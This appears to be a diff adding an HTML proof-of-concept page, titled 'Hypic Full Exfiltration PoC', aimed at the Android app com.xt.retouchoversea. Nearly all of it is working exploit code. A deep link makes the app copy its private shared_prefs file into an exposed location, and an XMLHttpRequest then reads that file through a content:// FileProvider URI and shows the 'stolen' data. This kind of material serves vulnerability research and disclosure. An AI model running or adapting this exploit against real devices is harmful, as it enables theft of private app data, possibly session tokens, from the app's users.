@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Hypic Full Exfiltration PoC</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: sans-serif; padding: 20px; }
+        #output { background: #f4f4f4; padding: 10px; border-radius: 5px; white-space: pre-wrap; word-wrap: break-word; font-size: 12px; }
+        button { padding: 15px 20px; font-size: 16px; background: #34c759; color: white; border: none; border-radius: 5px; cursor: pointer; margin-bottom: 10px; display: block; width: 100%;}
+    </style>
+</head>
+<body>
+    <h1>Hypic Exfiltration</h1>
+    
+    <button onclick="triggerLFD()">Step 1: Overwrite File (LFD)</button>
+    <button onclick="readExfiltratedFile()" style="background: #007bff;">Step 2: Read Stolen Data</button>
+
+    <h3>Stolen File Content:</h3>
+    <pre id="output">Waiting for actions...</pre>
+
+    <script>
+        function log(msg) {
+            var out = document.getElementById('output');
+            if (out.innerText === "Waiting for actions...") out.innerText = "";
+            out.innerText += msg + "\n\n";
+        }
+
+        // Step 1: Copy internal file to the exposed directory
+        function triggerLFD() {
+            log("[*] Triggering Deep Link to copy shared_prefs to capcut_cover.jpeg...");
+            window.location.href = "retouchoversea://picture_edit?picture_path=file:///data/data/com.xt.retouchoversea/shared_prefs/com.xt.retouchoversea_preferences.xml";
+        }
+
+        // Step 2: Read the copied file via XMLHttpRequest using the insecure FileProvider
+        function readExfiltratedFile() {
+            log("[*] Attempting to read copied file via FileProvider...");
+            
+            // The file was copied to /data/data/com.xt.retouchoversea/files/capcut_cover.jpeg
+            // The FileProvider exposes this via content://com.xt.retouchoversea.provider/files_path/capcut_cover.jpeg
+            var targetUri = "content://com.xt.retouchoversea.provider/files_path/capcut_cover.jpeg";
+            
+            var xhr = new XMLHttpRequest();
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 200 || xhr.status === 0) {
+                        if (xhr.responseText) {
+                            log("[SUCCESS] File Read! Content length: " + xhr.responseText.length + "\n" + xhr.responseText.substring(0, 1000) + "...");
+                        } else {
+                            log("[SUCCESS but EMPTY] Request worked but file is empty.");
+                        }
+                    } else {
+                        log("[ERROR] Failed to read file. Status: " + xhr.status + "\n" + xhr.responseText);
+                    }
+                }
+            };
+            xhr.open("GET", targetUri, true);
+            xhr.send();
+        }
+    </script>
+</body>
+</html>
